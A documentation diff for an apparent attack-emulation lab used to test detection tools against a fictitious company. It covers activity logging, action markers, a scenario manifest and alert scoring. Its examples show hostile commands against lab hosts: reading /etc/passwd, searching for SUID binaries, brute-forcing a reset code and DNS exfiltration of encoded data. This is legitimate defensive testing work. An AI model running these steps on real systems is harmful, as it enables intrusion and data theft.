@@ -4,7 +4,7 @@ Everything beyond the quick-start guide in the [README](../README.md).
 
 > **About the name.** *Cymylau* is Welsh for "clouds" (roughly "kuh-MUL-eye"). **Cymylau Ltd is a fictitious company**, invented as the victim in this lab's decoy data: the made-up web portal, email addresses, credentials and documents all belong to it. It is not a real organisation, and any resemblance to a real company of that name is coincidental. Decoy addresses use the reserved `.example` domain.
 
-Contents: [The activity log](#the-activity-log) · [Untrusted-field handling](#untrusted-field-handling) · [Scoring your tool](#scoring-your-tool) · [Destination confirmation](#destination-confirmation) · [One technique or tactic](#running-one-technique-or-tactic) · [Preflight and CI](#preflight-teardown-and-ci) · [Safety design](#safety-design) · [Components](#components) ·
+Contents: [The activity log](#the-activity-log) · [Action markers](#action-markers) · [The scenario manifest](#the-scenario-manifest) · [Untrusted-field handling](#untrusted-field-handling) · [Scoring your tool](#scoring-your-tool) · [Destination confirmation](#destination-confirmation) · [One technique or tactic](#running-one-technique-or-tactic) · [Preflight and CI](#preflight-teardown-and-ci) · [Safety design](#safety-design) · [Components](#components) ·
 [Running pieces separately](#running-pieces-separately) ·
 [Stealth profiles](#stealth-profiles) ·
 [OWASP Top 10:2025 scenarios](#owasp-top-10-2025-scenarios) ·
@@ -17,18 +17,38 @@ one JSON line each, and shown as a table at the bottom of every scenario,
 every chain, and the end of `run-everything.sh`:
 
 ```
-Time          Technique  Command              Source       Destination   Path / ID
-09:43:44.808  OWASP-A06  curl -s -X GET       ops-console  web-portal    /reset?user=alice&code=0000 (x91 over 2s)
-09:41:15.898  T1048.003  dig +short @dns-sink A  ops-console  dns-sink   0.1794044475.ewogICJD…exfil.internal
+Time          Technique  Command                                  Source       Destination  Path / ID
+09:39:01.102  OWASP-A06  curl -s --max-time 5 http://web-portal:…  ops-console  web-portal   /reset?user=alice&code=0000 (x91 over 2s)
+09:38:50.315  T1048.003  dig +short +tries=1 +time=2 @172.20.0.3…  ops-console  dns-sink     0.1794130730.ewogICJD…exfil.internal
 ```
 
 | column | meaning |
 |---|---|
 | Time | UTC, millisecond precision |
 | Technique | ATT&CK technique ID, or `OWASP-Axx` |
-| Command | what was run or sent |
+| Command | the exact command line that ran (or a short label, with the exact one in `argv`) |
 | Source / Destination | container (compose service) names; the decoy metadata service is shown as `ops-console (decoy IMDS)`, and `docker` commands show `docker-sandbox` |
 | Path / ID | URL path, file path, DNS name, or other unique identifier |
+
+**The record is written by the code that runs the action.** Scenarios do not
+describe what they did next to the command; they run it through `ax` (in
+`playbooks/lib-activity.sh`):
+
+```bash
+ax_here /etc/passwd -- cat /etc/passwd            # local action, current technique
+ax T1048.003 "$DNS_SINK" "$qname" -- dig +short @"$SINK_IP" "$qname" A
+ax_here --ok 0,1 / -- find / -perm -4000 -type f  # exit 1 is normal for this find
+```
+
+`ax` runs the command exactly as written (output, redirections and exit status
+are unchanged) and records its real `argv`, exit status (`rc`), start and end
+time, whether that exit status is the expected one (`ok`, from `--ok`; default
+`0`), and the action's [marker](#action-markers). So a step that did not happen,
+because a tool was missing or the command failed, cannot appear in the log as if it
+had. The one exception is a command inside an SSH session the lab ran as one
+action: those are recorded with `act_declared`, as `kind: "declared"`, carrying the
+session's marker in `parent`. `tests/check-docs.py` fails if a scenario writes a
+record by hand.
 
 Under the table, **Attacks covered** lists every technique that ran, with
 its name and how many actions it comprised.
@@ -36,7 +56,7 @@ its name and how many actions it comprised.
 Bursts of the same action (a brute-force loop, sequential IDs) are
 collapsed to one row with a count in the printed table. Nothing is lost:
 `activity.csv` and `activity.jsonl` hold every row and extra fields
-(`step`, `result`, `scenario`, `profile`).
+(`kind`, `argv`, `rc`, `ok`, `marker`, `parent`, `end`, `step`, `run`, `scenario`, `profile`).
 
 ```bash
 python3 playbooks/activity-report.py results/activity.jsonl --full          # every row, as a table
@@ -45,11 +65,62 @@ python3 playbooks/activity-report.py results/activity.jsonl --scenario run-owasp
 python3 playbooks/activity-report.py results/activity.jsonl --since 1794044400   # epoch seconds
 ```
 
-The log is written by plain bash built-ins on purpose: recording it never
-starts an extra process, so the bookkeeping cannot show up as attacker
-behaviour in your telemetry. Technique names come from
-`playbooks/techniques.tsv`. `activity.jsonl` accumulates across runs; the
-report from `run-everything.sh` covers only that run.
+The bookkeeping uses bash built-ins: recording a record never starts a
+program of its own, so it cannot show up as attacker behaviour in your
+telemetry. Technique names come from `playbooks/techniques.tsv`.
+`activity.jsonl` accumulates across runs; the report from `run-everything.sh`
+covers only that run.
+
+## Action markers
+
+Every external command a scenario runs carries a marker, `cdl-<run>-<n>`, on its
+`argv[0]`. `cat /etc/passwd` runs as
+
+```
+cat#cdl-025a-913482101 /etc/passwd
+```
+
+The executable, its path and the kernel's process name (`comm`) are unchanged, so
+rules keyed on the binary or image name still fire. The marker shows wherever a
+tool records the **command line**. SSH sessions also carry it as a comment in the
+remote command (`bash -s # cdl-…`), so the commands run inside the session have it
+in their parent's command line. `<run>` is the run id `run-everything.sh` prints at
+the start and saves in `last_run.json`.
+
+[Scoring](#scoring-your-tool) uses the marker to tie an alert to the exact action
+that caused it, without relying on time windows or on the tool's technique tags.
+
+Shell built-ins (`history -c`, a write done by the shell itself) have no process of
+their own, so their records have no marker. The untrusted-fields scenario's
+`argv[0]` test (UFLD-03) runs without one, because there `argv[0]` is the value
+under test.
+
+**Trade-off:** a detection rule that matches the whole command line from its first
+character (for example `CommandLine startswith "cat "`) sees `cat#cdl-…` instead.
+Rules on the binary, its arguments or its parent are unaffected. To test with
+unmodified command lines, run with `--no-markers` (or `ACT_MARKERS=0`); scoring then
+falls back to technique and time, and says so.
+
+## The scenario manifest
+
+`playbooks/scenarios.json` lists every scenario script, in run order, with its
+title, the chain that runs it, what it needs first, whether it needs the
+privileged overlay, and the techniques it performs. It is the single source for:
+
+- the stages of `run-full-chain.sh` and `run-privileged-chain.sh`
+  (`python3 playbooks/scenario-index.py chain base` prints them);
+- `--technique` / `--tactic` selection and `--list`;
+- the README test list check in `tests/check-docs.py`.
+
+Each run is then checked against it (`observe.py`, see
+[Destination confirmation](#destination-confirmation)). A technique a scenario
+recorded that the manifest does not list for it, or, at the noisy profile, a listed
+technique the scenario did not perform, fails the run check. Techniques that only
+some profiles perform are listed under `conditional`, with the reason.
+
+To add a scenario: write `playbooks/run-<name>.sh`, run every action through `ax`,
+add an entry to `scenarios.json` and the technique names to `techniques.tsv`, and
+list the techniques in the README. `tests/check-docs.py` tells you what is missing.
 
 ## Untrusted-field handling
 
@@ -62,7 +133,8 @@ Four carriers each do the same real action twice, a few seconds apart, as a
 `MARK-DECOY-<session>-<n>`): HTTP User-Agent (UFLD-01), SSH username
 (UFLD-02), `argv[0]` of a renamed binary (UFLD-03), archive file name
 (UFLD-04). The activity log records `pair`, `variant` (`control`/`marked`) and
-`marker` for these rows.
+`ref` (the `MARK-DECOY-…` token) for these rows. (These tokens are the scenario's
+test values; they are separate from the per-action `cdl-…` [markers](#action-markers).)
 
 `playbooks/untrusted-fields-report.py --tool-output <file-or-folder>` scans an
 export from your tool for the marker tokens and writes
@@ -74,8 +146,9 @@ blank for you.
 Notes from building it:
 - Recent OpenSSH (`PerSourcePenalties`) drops new connections from an address for
   about 20 seconds after a failed login, so the scenario waits 22 real seconds
-  (not scaled by `STEALTH_TIME_SCALE`) before the marked SSH attempt. The
-  `result` field in the activity log records whether each attempt reached sshd.
+  (not scaled by `STEALTH_TIME_SCALE`) before the marked SSH attempt. A UFLD-02
+  record is `ok` only when `sshpass` exited 5 (password rejected), which means the
+  username reached sshd's authentication and was logged.
 - The OpenSSH client rejects some characters in a username, which is why the
   marker is a single plain token.
 
@@ -93,11 +166,24 @@ detected, partly detected or missed.
   `timestamp`, `ts`, `_time`, `created_at`, `detected_at`, ...; ISO 8601 or epoch
   seconds/milliseconds; no zone means UTC). Any technique IDs in the alert
   (`T1552.005`, `OWASP-A05`, `A05:2025`, or in tags and rule names) are picked up.
-- **Match:** an alert counts for an action if its time is from 2 seconds before
-  the action to `--window` seconds after it (default 120). **Detected** means the
-  alert names the same technique (a parent such as `T1552` matches `T1552.005`).
-  **Partial** means an alert fired in the window but named no technique or a
-  different one, so it may be unrelated; confirm by hand. **Missed** means no alert.
+- **Match by marker (exact).** An alert whose text contains an action's
+  [marker](#action-markers) was caused by that action. Export the process command
+  line (and the parent command line, for the SSH session steps) so the marker is in
+  the export. A step inside an SSH session shares the session's marker, so it also
+  needs the alert to name its technique.
+- **Match by technique and time (fallback).** For an action with no marker match:
+  an alert naming the action's exact technique, from 2 seconds before the action to
+  `--window` seconds after it (default 120). Alerts that carry a marker are already
+  attributed and are not reused by time, so one alert cannot also credit its
+  neighbours.
+- **Result per action.** **Detected**: matched by marker (the alert names this
+  technique, its parent, or none), or by technique and time. **Partial**: matched by
+  marker but the tool named a different technique, or in the window only an alert
+  naming the parent technique (`T1552` for `T1552.005`), or one naming nothing or
+  something else. **Missed**: nothing. **Not-run**: the action did not run as
+  expected (an unexpected exit status), so it is not scored at all. The `--csv`
+  detail says how each action was matched (`marker`, `marker+tag`, `tag+time`,
+  `parent tag+time`, `other alert in window`).
 - **Which run:** `activity.jsonl` accumulates across runs, so by default only the
   latest `run-everything.sh` run is scored (its start time comes from
   `results/last_run.json`). `--since EPOCH` picks a different start; `--all-runs`
@@ -108,35 +194,59 @@ detected, partly detected or missed.
   ATT&CK Navigator layer.
 
 It warns (on stderr) when alert rows have no recognisable time field, when no
-alerts could be read at all, and when none of the alerts fall inside the run's
-time range: the usual causes of an "everything missed" result that is really an
+alerts could be read at all, when none of the alerts fall inside the run's
+time range, and when markers were on but no alert carries one (the export has no
+command lines, so every match is by time): the usual causes of an "everything missed" result that is really an
 export or time-zone problem. A bare number is never taken as a time unless it is
 in a time-named field, so numeric alert IDs are not mistaken for timestamps.
 
 A noisy tool that fires generic alerts will show many `partial` results. Treat
 `detected` as the reliable column and review `partial` by hand.
 
+**Ordering and grouping.** The default run fires about 30 techniques within a
+couple of minutes, so a tool's deduplication or incident grouping can fold later
+alerts into earlier ones, and time-window matches can overlap. `--gap SECONDS`
+(for example `bash run-everything.sh --gap 180`) waits that long whenever the
+technique changes, across scenario scripts too, so each technique has a quiet
+window of its own. Make the gap longer than `--window` when you rely on
+technique-and-time matching. A full run changes technique about 40 times, so
+`--gap 180` makes it about 2 hours (`--gap 60`: about 45 minutes); `--technique`
+or `--only` keeps it shorter.
+
 ## Destination confirmation
 
-The activity log is the attacker's view. `observe.py` (run by `run-everything.sh`)
-checks each remote action against what the destination recorded, and adds a
-"Seen at dest" column to the report: `yes`, `NO` or `n/a`.
+`observe.py` (run by `run-everything.sh` at the end) checks each action and adds
+a "Seen at dest" column to the report:
+
+| value | meaning |
+|---|---|
+| `yes` | ran, and the destination's own log has a matching record |
+| `NO` | ran, but the destination should have logged it and did not |
+| `ran` | a local action that ran and exited as expected; its exit status is the evidence |
+| `FAILED` | exited with a status the scenario does not expect: the technique may not have happened |
+| `declared` | a command inside an SSH session that ran as one action; confirmed through that session |
+| `n/a` | nothing to check (`docker-sandbox` keeps no per-request log) |
 
 The services keep timestamped `results/server_<name>.jsonl` records
 (`control-api`, `web-portal`, `dns-sink`, and the decoy metadata service as
 `imds`); sshd's auth log is saved as `results/server_sshd.log`. An action is
 confirmed if a matching record appears from 1 second before to 6 seconds after
-it. `n/a` means there is nothing to check: local actions, port scans, commands
-inside an already-confirmed SSH session, and `docker-sandbox` (no per-request
-log). `NO` is worth investigating before reading anything into a missing
-detection: the traffic may never have arrived. The result is written to
+it. `NO` and `FAILED` are worth investigating before reading anything into a
+missing detection: the action may never have happened. The result is written to
 `results/activity_confirmed.jsonl`.
+
+It then checks the run against the [scenario manifest](#the-scenario-manifest)
+and writes `results/run_check.json`: failed actions, techniques recorded but not
+listed, and listed techniques not performed. Any of those makes the run check
+fail, and `run-everything.sh` then ends with `FINISHED WITH FAILURES` and a
+non-zero exit even when every stage exited 0.
 
 ## Running one technique or tactic
 
 `bash run-everything.sh --technique T1552.005`, `--tactic credential-access`, or
-`--list`. `playbooks/scenario-index.py` reads the scripts' own `st_mark`/`act`
-calls to map techniques to scripts, so the mapping cannot drift from what runs.
+`--list`. `playbooks/scenario-index.py` maps techniques to scripts from the
+[scenario manifest](#the-scenario-manifest), and every run is checked against the
+same manifest, so a mapping that drifts from what runs is caught.
 IDs can be ATT&CK (a parent such as `T1552` selects its sub-techniques),
 `OWASP-A05`/`A05`, or `UFLD-01`. Tactics come from the third column of
 `playbooks/techniques.tsv`. Selected scripts run in the same order as the full
@@ -156,11 +266,13 @@ no traffic on the network. After lock-down it checks that no lab container still
 has a default route, and stops before any scenario if one does.
 
 **At the end** it prints a stage summary (`ok` or `FAILED (exit N)` for each
-scenario script) and writes `results/last_run.json`: start and end time,
-`--only`, stealth profile and each stage's exit code. One failed scenario does
-not stop the others. The ownership fix, destination confirmation and activity
+scenario script), runs the [destination confirmation and run
+check](#destination-confirmation), and writes `results/last_run.json`: start and
+end time, run id, whether markers were on, the gap, `--only`, stealth profile,
+the run check result (`action_check`) and each stage's exit code. One failed
+scenario does not stop the others. The ownership fix, confirmation and activity
 report still run, and the command exits non-zero. The last line is
-`[run-everything] done.` only when every stage passed. Inside the chains
+`[run-everything] done.` only when every stage passed and the run check is ok. Inside the chains
 (`run-full-chain.sh`, `run-privileged-chain.sh`) each scenario's exit code is
 recorded the same way and printed as a table at the end of the chain's log.
 
@@ -172,14 +284,16 @@ covers:
 - `tests/test_tools.py`, unit tests for the reporting, scoring, confirmation
   and selection tools (`python3 -m unittest discover -s tests`, no Docker
   needed);
-- `tests/check-docs.py`, which fails if the README's test list disagrees with
-  what the scripts record, a technique has no name, a `run-everything.sh` option
-  is undocumented, or a local link or anchor is broken (`--online` also checks
-  external links).
+- `tests/check-docs.py`, which fails if `scenarios.json` and the scenario scripts
+  disagree, a scenario writes an activity record by hand instead of through `ax`,
+  the README's test list disagrees with the manifest, a technique has no name, a
+  `run-everything.sh` option is undocumented, or a local link or anchor is broken
+  (`--online` also checks external links).
 
 A smoke job then runs the OWASP scenarios, then `--technique T1552.005` on the
 same lab without tearing it down. It fails if any web-app category was not
-exercised, an action never reached its destination, or a stage failed.
+exercised, an action never reached its destination, a stage failed, or the run
+check failed.
 
 ## Safety design
 
@@ -228,11 +342,12 @@ To report a problem, see [SECURITY.md](../SECURITY.md).
 | `playbooks/` | setup + one script per scenario |
 | `playbooks/lib-stealth.sh` | stealth profile definitions and helpers |
 | `playbooks/detection-report.py` | scores an alert export against the activity log; writes an ATT&CK Navigator layer |
-| `playbooks/observe.py` | confirms each action in the destination's own logs |
-| `playbooks/scenario-index.py` | maps techniques and tactics to scripts for `--technique` / `--tactic` |
+| `playbooks/observe.py` | confirms each action in the destination's own logs and checks the run against the manifest |
+| `playbooks/scenarios.json` | the scenario manifest: every scenario, its chain, prerequisites and techniques |
+| `playbooks/scenario-index.py` | reads the manifest: chain stages, `--technique` / `--tactic` selection, `--list` |
 | `tests/check-docs.py`, `tests/test_tools.py`, `.github/workflows/ci.yml` | docs-vs-code drift check, unit tests for the Python tools, and CI |
 | `playbooks/lib-chain.sh` | runs each stage of a chain script, keeps going past a failure, prints a stage summary and sets the exit code |
-| `playbooks/lib-activity.sh`, `playbooks/activity-report.py`, `playbooks/techniques.tsv` | the activity log: recording, table/CSV report, technique names |
+| `playbooks/lib-activity.sh`, `playbooks/activity-report.py`, `playbooks/techniques.tsv` | the activity log: `ax` (runs and records each action, adds its marker), table/CSV report, technique names |
 | `playbooks/run-stealth-sweep.sh` | runs the base chain at every stealth profile and prints a comparison |
 | `playbooks/run-untrusted-fields.sh`, `playbooks/untrusted-fields-report.py` | optional untrusted-telemetry-field scenario and its marker checker |
 | `playbooks/run-owasp-top10.sh` | OWASP Top 10:2025 application-attack scenarios |
@@ -278,8 +393,8 @@ the setup above covers:
 | Needs | Scenarios |
 |---|---|
 | `bootstrap.sh` (the decoy IMDS on 169.254.169.254) | `metadata-exfil` |
-| `seed-decoys.sh` | `credential-discovery`, `collection-staging`, `workload-identity-theft` (`https-exfil` and `untrusted-fields` seed for themselves) |
-| `install-extra-tools.sh` | `lateral-movement`, `ssh-audit-session`, `collection-staging` (zip) |
+| `seed-decoys.sh` | `credential-discovery`, `collection-staging`, `workload-identity-theft` (`http-exfil`, `https-exfil` and `untrusted-fields` seed for themselves) |
+| `install-extra-tools.sh` | `lateral-movement`, `ssh-audit-session`, `collection-staging` (zip), `credential-discovery` (sqlite3), `host-recon` (sudo), `persistence` (cron) |
 | the overlay + `install-container-tools.sh` | `docker-socket-escape`, `privileged-container-abuse`, `image-secret-discovery` |
 
 **3. Report and tear down.** Files written by the containers are owned by root
@@ -292,6 +407,10 @@ docker compose exec -T internal-host cat /config/logs/openssh/current > results/
 python3 playbooks/observe.py --results results
 python3 playbooks/activity-report.py results/activity_confirmed.jsonl
 ```
+
+Scenarios run this way get a fresh run id per script and markers on; pass
+`-e CDL_RUN=abcd` to share one run id across scripts, and `-e ACT_MARKERS=0` or
+`-e ACT_GAP=180` for the equivalents of `--no-markers` and `--gap`.
 
 ## Stealth profiles
 
